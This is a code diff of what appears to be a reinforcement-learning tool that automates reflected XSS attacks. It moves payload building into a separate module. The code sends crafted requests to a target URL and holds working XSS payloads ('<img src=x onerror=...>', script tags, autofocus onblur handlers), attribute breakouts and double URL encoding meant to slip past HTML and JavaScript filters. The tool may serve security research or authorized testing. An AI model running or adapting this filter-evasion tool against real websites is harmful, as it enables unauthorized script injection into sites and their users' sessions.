@@ -1,6 +1,7 @@
+import functools
 from bs4 import BeautifulSoup
 import sys, random, string, requests, re
-import utils
+import utils, xssExploit
 
 # To add a new action: 
 #  create a new method
@@ -16,28 +17,16 @@ import utils
 class Enviroment:
 
     # Constructor that initiates the environment
-    def __init__(self, argv):
+    def __init__(self, url, method, parameter):
 
         # Check user input
-        self.url, self.method, self.parameter = utils.checkParameters(argv)
+        self.url, self.method, self.parameter = url, method, parameter
         
-        # Initiliaze xss payload
-        self.js = ""
-        self.html = ""
-        self.html_padding_sx=""
-        self.html_padding_dx=""
-        self.padding_sx = ""
-        self.padding_dx = ""
-        self.payload = ""
-        self.validHtml = ""
-
-        # Initiliaze xss trigger
+        # Initiliaze xssPayload
+        self.xssExploit = xssExploit.XssExploit()
+        
+        # Injection point in response
         self.injection_point = ""
-        self.expected_html = ""
-        self.expected_html_padding_sx = ""
-        self.expected_html_padding_dx = ""
-        self.expected_js = ""
-        self.expected = ""
 
         # States
         self.states_name_to_location = {
@@ -56,7 +45,6 @@ class Enviroment:
             4:"avoidJsFilters",
             5:"exploited"
         }
-        self.n_states = len(self.states_name_to_location)
 
         # Actions
         self.actions = {
@@ -87,6 +75,8 @@ class Enviroment:
     def getNumOfActions(self,state):
         if state >= 0 and state < len(self.states_name_to_location):
             return len(self.actions[state])
+        else: 
+            return 0
 
     # CONNECTION TO ENDPOINT
 
@@ -140,11 +130,11 @@ class Enviroment:
         # No exception, so return response
         return response
 
-    # only connect if the html is syntactically valid
+    # Only connect if the html is syntactically valid
     def connectionIfHtmlValid(self, response):
         print("Local test: {}".format(response))
         if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
-            return self.connection(self.payload)
+            return self.connection(self.xssExploit.payload())
         else:
             return ""
 
@@ -154,16 +144,11 @@ class Enviroment:
 
     # XSS EXPLOITATION
 
-    # Build XSS payload and expected response
-    def buildPayload(self):
-        self.payload = self.padding_sx + self.html_padding_sx + str(self.html).replace("{}", self.js, 1) + self.html_padding_dx + self.padding_dx
-        self.expected = self.expected_html_padding_sx + str(self.expected_html).replace("{}", self.expected_js, 1) + self.expected_html_padding_sx
-
     # Returns the tag into where the random string was injected
     def getInjectionPoint(self, response):
         soup = BeautifulSoup(response,features="lxml")
-        for elem in soup(text=re.compile(self.expected)):
-            self.injection_point = str(elem.parent).lower().replace(self.expected.lower(), "{}", 1)
+        for elem in soup(text=re.compile(self.xssExploit.expected())):
+            self.injection_point = str(elem.parent).lower().replace(self.xssExploit.expected().lower(), "{}")
             break
 
     # Execute action and return reward
@@ -171,78 +156,86 @@ class Enviroment:
         print("\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
         
         self.actions[state][action]()
-        self.buildPayload()
 
         # Check if state is locally tested
         response = ""
         if state == self.states_name_to_location["findValidHtml"]:
-            response = self.connectionIfHtmlValid(self.injection_point.lower().replace("{}",self.html,1))
+            response = self.connectionIfHtmlValid(self.injection_point.lower().replace("{}",self.xssExploit.getHtml()))
         else:
-            response = self.connection(self.payload)
+            response = self.connection(self.xssExploit.payload())
         
         return self.goalCheck(state,response)
 
     # Checks if an XSS has been triggered
     def goalCheck(self, state, response):
 
-        # DEBUG
+        # Handling exception
+        if type(response) != requests.models.Response:
+            print("{} error: {}".format(response["type"],response["msg"]))
+            sys.exit(1)
+
+        expected = self.xssExploit.expected()
         if response:
-            print("Expected: {}\nResponce> {}".format(self.expected.lower(),response.text.lower()))
+            response = response.text
+            print("Expected: {}\nResponce> {}".format(expected.lower(), response.lower()))
         else: 
             print("Local test: not valid HTML")
+        
+        # Condictions
+        isExpectedResponse = expected.lower() in response.lower()
+
         # TEST REFLECTION STATE
         if self.states_location_to_name[state] == "testReflection":
-            if self.expected.lower() in response.text.lower():
-                print("[passed] payload: {}".format(self.payload))
-                self.getInjectionPoint(response.text)
+            if isExpectedResponse:
+                print("[passed] payload: {}".format(self.xssExploit.payload()))
+                self.getInjectionPoint(response)
                 return self.states_name_to_location["findValidHtml"], 100, False
             else:
-                print("[filtered] payload: {}".format(self.payload))
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["addPadding"], -1, False
 
         # ADD PADDING STATE
         elif self.states_location_to_name[state] == "addPadding":
-            if self.expected.lower() in response.text.lower() and self.payload.lower() not in response.text.lower():
-                print("[passed] payload: {}".format(self.payload))
-                self.getInjectionPoint(response.text)
+            if isExpectedResponse and self.xssExploit.payload().lower() not in response.lower():
+                print("[passed] payload: {}".format(self.xssExploit.payload()))
+                self.getInjectionPoint(response)
                 return self.states_name_to_location["findValidHtml"], 100, False
-            elif self.payload.lower() not in response.text.lower():
-                print("[filtered] payload: {}".format(self.payload))
+            elif self.xssExploit.payload().lower() not in response.lower():
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["addPadding"], 10, False
             else:
-                print("[filtered] payload: {}".format(self.payload))
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["addPadding"], -1, False
 
         # FIND VALID HTML STATE
         elif self.states_location_to_name[state] == "findValidHtml":
-            self.validHtml = self.html
             if response != "":
-                if self.expected.lower() in response.text.lower():
-                    print("[passed] payload: {}".format(self.payload))
+                if isExpectedResponse:
+                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                     return self.states_name_to_location["avoidJsFilters"], 100, False
                 else:
-                    print("[passed] payload: {}".format(self.payload))
+                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                     return self.states_name_to_location["avoidHtmlFilters"], 100, False
             else:
-                print("[filtered] payload: {}".format(self.payload))
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["findValidHtml"], -1, False
 
         # AVOID HTML FILTERS STATE 
         elif self.states_location_to_name[state] == "avoidHtmlFilters":
-            if self.expected.lower() in response.text.lower():
-                print("[passed] payload: {}".format(self.payload))
+            if isExpectedResponse:
+                print("[passed] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["avoidJsFilters"], 100, False
             else:
-                print("[filtered] payload: {}".format(self.payload))
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["avoidHtmlFilters"], -1, False
 
         # AVOID JS FILTERS STATE 
         elif self.states_location_to_name[state] == "avoidJsFilters":
-            if self.expected.lower() in response.text.lower():
-                print("[passed] payload: {}".format(self.payload))
+            if isExpectedResponse:
+                print("[passed] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["exploited"], 100, True
             else:
-                print("[filtered] payload: {}".format(self.payload))
+                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                 return self.states_name_to_location["avoidJsFilters"], -1, False
 
     # RESET AND GO BACK FUNCTIONS 
@@ -252,24 +245,23 @@ class Enviroment:
 
         # TEST REFLECTION STATE
         if self.states_location_to_name[state] == "testReflection":
-            self.html=""
+            self.xssExploit.setHtmlBody("","")
         
         # ADD PADDING STATE
         elif self.states_location_to_name[state] == "addPadding":
-            self.padding_dx = ""
-            self.padding_sx = ""
+            self.xssExploit.setPaddings("","")
         
         # FIND VALID HTML STATE
         elif self.states_location_to_name[state] == "findValidHtml":
-            self.html = ""
+            self.xssExploit.setHtmlSyntaxPaddings("","","","")
         
         # AVOID HTML FILTERS STATE 
         elif self.states_location_to_name[state] == "avoidHtmlFilters":
-            self.html = self.validHtml
+            self.xssExploit.setHtmlBody("","")
 
         # AVOID JS FILTERS STATE 
         elif self.states_location_to_name[state] == "avoidJsFilters":
-            self.js = ""
+            self.xssExploit.setJsBody("","")
 
     # Go to the previous state, return the new state and a boolean indicating whether one has returned to the starting point
     def goBack(self, state):
@@ -298,45 +290,39 @@ class Enviroment:
 
     def actionNewTestString(self):
         random_string = "".join((random.choice(string.ascii_letters) for i in range(10)))
-        self.html = random_string
-        self.expected_html = random_string
+        self.xssExploit.setHtmlBody(random_string, random_string)
     
     # ACTIONS ADD PADDING
 
     def actionAddSxRandomChar(self):
-        self.padding_sx += "".join(random.choices(string.ascii_letters, k=1))
+        self.xssExploit.setPaddings("".join(random.choices(string.ascii_letters, k=1)),"")
 
     def actionAddDxRandomChar(self):
-        self.padding_dx += "".join(random.choices(string.ascii_letters, k=1))
+        self.xssExploit.setPaddings("","".join(random.choices(string.ascii_letters, k=1)))
 
     # ACTIONS FIND VALID HTML
 
     def actionInjectionInTag(self):
-        # set default html payload
+        # Set default html payload
         htmlPayload = "<img src=x onerror={}>"
-        self.html = htmlPayload
-        self.expected_html = htmlPayload
+        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
 
     def actionInjectionInAttribute(self):
-        # find open tag
+        # Find open tag
         tag = re.findall("<(\w*)",self.injection_point)
         if len(tag) > 0:
             tag = tag[0]
         else:
             tag = "p"
         
-        # set html padding
+        # Set html padding
         padding_sx = "\">"
         padding_dx = "< {} ".format(tag)
-        self.html_padding_sx = padding_sx
-        self.html_padding_dx = padding_dx
-        self.expected_html_padding_sx = padding_sx
-        self.expected_html_padding_dx = padding_dx
+        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
         
-        # set default html payload
+        # Set default html payload
         htmlPayload = "<img src=x onerror={}>"
-        self.html = htmlPayload
-        self.expected_html = htmlPayload
+        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
 
 
     # ACTIONS AVOID HTML FILTERS
@@ -345,24 +331,23 @@ class Enviroment:
         htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<input onblur={} autofocus><input autofocus>"]
         htmlPayload = "".join(random.choices(htmlPayloads, k=1))
         self.html = htmlPayload
-        self.expected_html = htmlPayload
+        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
 
     
     def actionDubleEncode(self):
-        singleEncoding = {"<":"3C",">":"3E","/":"2F","\\":"5C","\"":"22","'":"27"}
-        doubleEncoding = {"<":"253C",">":"253E","/":"252F","\\":"255C","\"":"2522","'":"2527"}
+        # Encoding dictionaries
+        singleEncoding = {"<":"3C", ">":"3E", "/":"2F", "\\":"5C", "\"":"22", "'":"27"}
+        doubleEncoding = {"<":"253C", ">":"253E", "/":"252F", "\\":"255C", "\"":"2522", "'":"2527"}
+
+        # Replace each character in the encoding dictionaries with the replaceValues function of XssExploit
         for key in singleEncoding:
-            self.html = self.html.replace(key, "%"+doubleEncoding[key])
-            self.html_padding_sx = self.html_padding_sx.replace(key, "%"+doubleEncoding[key])
-            self.html_padding_dx = self.html_padding_dx.replace(key, "%"+doubleEncoding[key])
-            self.expected_html = self.expected_html.replace(key, "%"+singleEncoding[key])
-            self.expected_html_padding_sx = self.expected_html_padding_sx.replace(key, "%"+singleEncoding[key])
-            self.expected_html_padding_dx = self.expected_html_padding_dx.replace(key, "%"+singleEncoding[key])
+            for fields in ("html_body","html_syntax_padding_sx", "html_syntax_padding_dx"):
+                self.xssExploit.replaceValues(True, fields, key, "%"+doubleEncoding[key])
+                self.xssExploit.replaceValues(False, fields, key, "%"+singleEncoding[key])
 
     # ACTIONS AVOID JS FILTERS
 
     def actionNewJsPayload(self):
         jsPayloads = ["alert(1)","print()","alert(String.fromCharCode(49)","prompt(8)"]
         jsPayload = "".join(random.choices(jsPayloads, k=1))
-        self.js = jsPayload
-        self.expected_js = jsPayload
+        self.xssExploit.setJsBody(jsPayload, jsPayload)
